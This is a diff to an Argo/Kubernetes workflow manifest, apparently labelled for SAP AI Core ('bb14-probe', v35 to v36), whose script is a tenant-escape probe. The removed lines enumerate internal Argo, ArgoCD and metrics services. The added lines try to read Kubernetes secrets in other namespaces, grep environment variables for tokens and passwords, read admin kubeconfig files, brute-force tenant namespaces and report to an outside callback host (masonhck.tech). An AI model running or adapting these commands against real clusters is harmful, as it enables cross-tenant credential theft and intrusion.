@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "35.0.0"
+    ai.sap.com/version: "36.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,48 +24,61 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V35 INTERNAL SERVICE READ ==="
+        echo "=== V36 CROSS-NS REFERENCE TEST ==="
         echo "=== $(date -u) ==="
+        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
+        echo "My namespace: $NS"
 
-        CB="https://www.masonhck.tech/ssrf.php?src=sap-v35"
-
-        # Direct reads of confirmed internal services
-        echo "=== ARGO WORKFLOWS API (100.108.37.178:2746) ==="
-        curl -sk --connect-timeout 5 "http://argo-server.argo.svc.cluster.local:2746/api/v1/workflows/rg-3ba0e0a4-cd927cab" 2>&1 | head -c 500
+        # 1. List all secrets in our namespace
+        echo "=== OUR NAMESPACE SECRETS ==="
+        ls /var/run/secrets/ 2>/dev/null
+        find / -name "*.secret" -o -name "secret*" 2>/dev/null | head -10
+        
+        # 2. Try to read Argo Workflows secrets
+        echo "=== ARGO SECRETS ==="
+        # The Argo controller might have mounted its own SA token
+        find /var/run/secrets -type f 2>/dev/null
+        
+        # 3. Check if we can access K8s API with default SA
+        echo "=== K8S API ACCESS ==="
+        # Even without SA token, try to access K8s API
+        curl -sk --connect-timeout 3 "https://kubernetes.default.svc/api/v1/namespaces/$NS/secrets" 2>&1 | head -c 300
         echo ""
-        curl -sk --connect-timeout 5 "http://100.108.37.178:2746/api/v1/info" 2>&1 | head -c 500
-        echo ""
-
-        echo "=== ARGOCD SERVER API (100.107.174.75) ==="
-        curl -sk --connect-timeout 5 "https://argocd-server.argocd.svc.cluster.local/api/v1/applications" 2>&1 | head -c 500
-        echo ""
-        # ArgoCD without auth
-        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/applications" 2>&1 | head -c 500
-        echo ""
-        # ArgoCD settings
-        curl -sk --connect-timeout 5 "https://argocd-server.argocd.svc.cluster.local/api/v1/settings" 2>&1 | head -c 500
-        echo ""
-
-        echo "=== METRICS SERVER (100.111.65.139) ==="
-        curl -sk --connect-timeout 5 "https://metrics-server.kube-system.svc.cluster.local/apis/metrics.k8s.io/v1beta1/nodes" 2>&1 | head -c 500
-        echo ""
-
-        echo "=== KUBE-DNS ==="
-        # Can we query kube-dns directly?
-        dig @100.104.0.10 argocd-server.argocd.svc.cluster.local +short 2>&1
-        dig @100.104.0.10 argo-server.argo.svc.cluster.local +short 2>&1
-
-        echo "=== SCAN ARGO WORKFLOWS NAMESPACE ==="
-        # Enumerate argo namespace services
-        for svc in argo-server workflow-controller argo-ui minio; do
-          ip=$(dig +short "$svc.argo.svc.cluster.local" 2>/dev/null | head -1)
-          if [ -n "$ip" ]; then
-            echo "FOUND: $svc.argo -> $ip"
-            # Try to read from it
-            curl -sk --connect-timeout 3 "http://$ip" 2>&1 | head -c 100
-          fi
+        
+        # 4. Try accessing other known namespaces directly
+        echo "=== CROSS-NS SECRET READ ATTEMPT ==="
+        # Try common namespace patterns for other tenants
+        for target_ns in "default" "kube-system" "argocd" "argo" "istio-system"; do
+          resp=$(curl -sk --connect-timeout 3 "https://kubernetes.default.svc/api/v1/namespaces/$target_ns/secrets" 2>&1 | head -c 100)
+          echo "$target_ns: $resp"
+        done
+        
+        # 5. Environment variables that might contain cross-NS references
+        echo "=== ENV SECRETS ==="
+        env | grep -iE "secret|token|key|pass|cred" | head -20
+        
+        # 6. Mounted volumes
+        echo "=== MOUNTED VOLUMES ==="
+        mount | grep -v "proc\|sys\|dev\|overlay\|tmpfs" | head -10
+        df -h 2>/dev/null | grep -v "proc\|sys\|dev\|overlay\|tmpfs" | head -10
+        
+        # 7. Check /etc/kubernetes and common paths
+        echo "=== K8S CONFIG ==="
+        cat /etc/kubernetes/admin.conf 2>/dev/null | head -5 || echo "No admin.conf"
+        cat /root/.kube/config 2>/dev/null | head -5 || echo "No kubeconfig"
+        
+        # 8. DNS enumeration for other tenant namespaces
+        echo "=== OTHER TENANT NS ENUM ==="
+        # Try to find other tenant namespaces by brute-forcing common RG patterns
+        for prefix in "rg-" "tenant-" "ns-"; do
+          for suffix in "default" "admin" "system"; do
+            ip=$(dig +short "${prefix}${suffix}.svc.cluster.local" 2>/dev/null | head -1)
+            if [ -n "$ip" ]; then
+              echo "FOUND NS: ${prefix}${suffix} -> $ip"
+            fi
+          done
         done
 
-        # Callback with summary
-        curl -s "${CB}&data=v35-done" 2>/dev/null | head -c 20
-        echo "=== V35 DONE $(date -u) ==="
+        curl -s "https://www.masonhck.tech/ssrf.php?src=sap-v36-xns" 2>/dev/null | head -c 10
+        echo ""
+        echo "=== V36 DONE $(date -u) ==="
